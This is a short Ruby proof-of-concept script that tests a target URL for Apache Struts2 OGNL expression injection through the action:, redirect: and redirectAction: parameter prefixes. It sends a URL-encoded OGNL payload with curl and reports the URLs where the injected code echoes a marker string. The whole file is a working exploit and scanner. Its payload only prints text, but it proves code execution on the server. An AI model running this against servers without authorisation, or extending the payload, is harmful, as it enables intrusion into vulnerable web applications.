require 'cgi'

poc =  CGI.escape("${")
poc += CGI.escape("#a_str=new java.lang.String('xxooxxoo'),")
poc += CGI.escape("#b_str=new java.lang.String('ooxxooxx'),")
poc += CGI.escape("#a_resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),")
poc += CGI.escape("#a_resp.getWriter().println(#a_str.concat(#b_str)),")
poc += CGI.escape("#a_resp.getWriter().flush(),")
poc += CGI.escape("#a_resp.getWriter().close()")
poc += CGI.escape("}")

prefixes = ["action:",
"redirect:",
"redirectAction:"]
prefixes.each do |prefix|
	new_poc = ARGV[0] + "?" + prefix + poc
	if /xxooxxooooxxooxx/ =~ `curl -g '#{new_poc}' 2>/dev/null`
		puts new_poc
	end
end